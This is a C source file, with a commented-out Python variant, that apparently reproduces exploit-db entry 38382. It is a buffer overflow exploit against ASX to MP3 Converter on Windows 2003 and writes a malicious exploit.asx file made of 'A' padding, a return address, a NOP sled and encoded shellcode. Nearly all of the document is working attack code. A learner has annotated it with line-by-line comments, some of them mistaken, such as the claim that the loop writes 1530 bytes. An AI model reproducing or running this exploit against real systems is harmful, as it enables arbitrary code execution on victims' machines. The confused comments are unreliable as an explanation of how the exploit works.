/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3 <<--- LOL
Additoinal comments by bundtboss.
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    int i; //defines i as an integer variable
    char *overwrite_offset = malloc(255); //char = 1byte ASCII value. *overwirte_offset is pointer to character. malloc(255) allocates 255 bytes of memory
    for(i = 0; i < 255; i += 5) { //declare i = 0. Condition = i is less than 255, increase i by 5
        char padding[] = "\x41\x41\x41\x41\x41"; // creates a character array with 5 ASCII "A"
        memcpy(overwrite_offset + i, padding, strlen(padding)); //memcpy copies n characters to memory dest: (allocated 255 bytes above) + the current value of i (so i bytes after the allocation?). From character source: which is the 6 "A"s in the padding. Strlen just defines how much to copy (the length of the padding). So this just copies As until i=255? Just 1530 As? 
    }
    memset(overwrite_offset + _msize(overwrite_offset) - 1, 0x00, 1); //memset function copies a character (0x00) to the first character (last 1) to location: overwrite_offset + _msize(overwrite_offset) - 1 which would be the start of the offset -> to the end of the offset, minus one, so the last byte of the offset

    char retn[] = "\x92\x72\x23\x74"; //character array for the return code,  Exchange eAX eDX, jb, AND Gv Ev, jb JZ (conditonal jump)
    char shellcode[] = //shellcode, should be replaced, but leave the NOP sled, just change the length based on payload length.
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
    "\xdb\xc8\xd9\x74\x24\xf4\xbd\xaf\x93\x43\xb4\x5e\x31\xc9\xb1"
    "\x52\x31\x6e\x17\x83\xee\xfc\x03\xc1\x80\xa1\x41\xe1\x4f\xa7"
    "\xaa\x19\x90\xc8\x23\xfc\xa1\xc8\x50\x75\x91\xf8\x13\xdb\x1e"
    "\x72\x71\xcf\x95\xf6\x5e\xe0\x1e\xbc\xb8\xcf\x9f\xed\xf9\x4e"
    "\x1c\xec\x2d\xb0\x1d\x3f\x20\xb1\x5a\x22\xc9\xe3\x33\x28\x7c"
    "\x13\x37\x64\xbd\x98\x0b\x68\xc5\x7d\xdb\x8b\xe4\xd0\x57\xd2"
    "\x26\xd3\xb4\x6e\x6f\xcb\xd9\x4b\x39\x60\x29\x27\xb8\xa0\x63"
    "\xc8\x17\x8d\x4b\x3b\x69\xca\x6c\xa4\x1c\x22\x8f\x59\x27\xf1"
    "\xed\x85\xa2\xe1\x56\x4d\x14\xcd\x67\x82\xc3\x86\x64\x6f\x87"
    "\xc0\x68\x6e\x44\x7b\x94\xfb\x6b\xab\x1c\xbf\x4f\x6f\x44\x1b"
    "\xf1\x36\x20\xca\x0e\x28\x8b\xb3\xaa\x23\x26\xa7\xc6\x6e\x2f"
    "\x04\xeb\x90\xaf\x02\x7c\xe3\x9d\x8d\xd6\x6b\xae\x46\xf1\x6c"
    "\xd1\x7c\x45\xe2\x2c\x7f\xb6\x2b\xeb\x2b\xe6\x43\xda\x53\x6d"
    "\x93\xe3\x81\x22\xc3\x4b\x7a\x83\xb3\x2b\x2a\x6b\xd9\xa3\x15"
    "\x8b\xe2\x69\x3e\x26\x19\xfa\xed\xa7\x55\x71\x85\xc5\x95\x84"
    "\xed\x43\x73\xec\x01\x02\x2c\x99\xb8\x0f\xa6\x38\x44\x9a\xc3"
    "\x7b\xce\x29\x34\x35\x27\x47\x26\xa2\xc7\x12\x14\x65\xd7\x88"
    "\x30\xe9\x4a\x57\xc0\x64\x77\xc0\x97\x21\x49\x19\x7d\xdc\xf0"
    "\xb3\x63\x1d\x64\xfb\x27\xfa\x55\x02\xa6\x8f\xe2\x20\xb8\x49"
    "\xea\x6c\xec\x05\xbd\x3a\x5a\xe0\x17\x8d\x34\xba\xc4\x47\xd0"
    "\x3b\x27\x58\xa6\x43\x62\x2e\x46\xf5\xdb\x77\x79\x3a\x8c\x7f"
    "\x02\x26\x2c\x7f\xd9\xe2\x5c\xca\x43\x42\xf5\x93\x16\xd6\x98"
    "\x23\xcd\x15\xa5\xa7\xe7\xe5\x52\xb7\x82\xe0\x1f\x7f\x7f\x99"
    "\x30\xea\x7f\x0e\x30\x3f";

    int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode); // integer variable buffer_size is the size of the memory block for the offset + the length of the return, plus the length of the shellcode
    char *buffer = malloc(buffer_size); // character variable buffer is a allocated segment of memory large enough to fit the whole buffer as measured above

    memcpy(buffer, overwrite_offset, _msize(overwrite_offset)); // copy the overwrite offset to the location of the buffer + the overwrite offset (putting the overwrite after the offset)
    memcpy(buffer + _msize(overwrite_offset), retn, strlen(retn)); // copy the return string/array to the end of the buffer offset?
    memcpy(buffer + _msize(overwrite_offset) + strlen(retn), shellcode, strlen(shellcode)); // copy the shellcode to the end of the return (which is after the offset)
    memset(buffer + buffer_size - 1, 0x00, 1); // put a 0x00 at the end? I don't understand why.
    // As to offset + return + shellcode + 0x00

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer); 
    fclose(fp);

    return 0;

}
/*  https://www.exploit-db.com/exploits/38382/
import struct
filename = "exploit.asx"

dummy = "A"*0x104 # 260 As
EIP   = struct.pack('<I', 0x76af3adc) # create a packed little-endian data structure containing... wait is this backwards? It doesn't matter, it's the return address.
FFFF  = "\xFF\xFF\xFF\xFF" # Some Fs?
NOP   = "\x90"*4
Shell = ("\x31\xc9\xbd\x90\xb7\x29\xb8\xd9\xf7\xd9\x74\x24\xf4\xb1\x1e"
		 "\x58\x31\x68\x11\x03\x68\x11\x83\xe8\x6c\x55\xdc\x44\x64\xde"
		 "\x1f\xb5\x74\x54\x5a\x89\xff\x16\x60\x89\xfe\x09\xe1\x26\x18"
		 "\x5d\xa9\x98\x19\x8a\x1f\x52\x2d\xc7\xa1\x8a\x7c\x17\x38\xfe"
		 "\xfa\x57\x4f\xf8\xc3\x92\xbd\x07\x01\xc9\x4a\x3c\xd1\x2a\xb7"
		 "\x36\x3c\xb9\xe8\x9c\xbf\x55\x70\x56\xb3\xe2\xf6\x37\xd7\xf5"
		 "\xe3\x43\xfb\x7e\xf2\xb8\x8a\xdd\xd1\x3a\x4f\x82\x28\xb5\x2f"
		 "\x6b\x2f\xb2\xe9\xa3\x24\x84\xf9\x48\x4a\x19\xac\xc4\xc3\x29"
		 "\x27\x22\x90\xea\x5d\x83\xff\x94\x79\xc1\x73\x01\xe1\xf8\xfe"
		 "\xdf\x46\xfa\x18\xbc\x09\x68\x84\x43")

exploit = dummy + EIP + FFFF + NOP + Shell # bunch of As, the return address, some FF, the 4 byte NOP, and then the shell

f = open(filename,'wb')
f.write(exploit)
f.close()
*/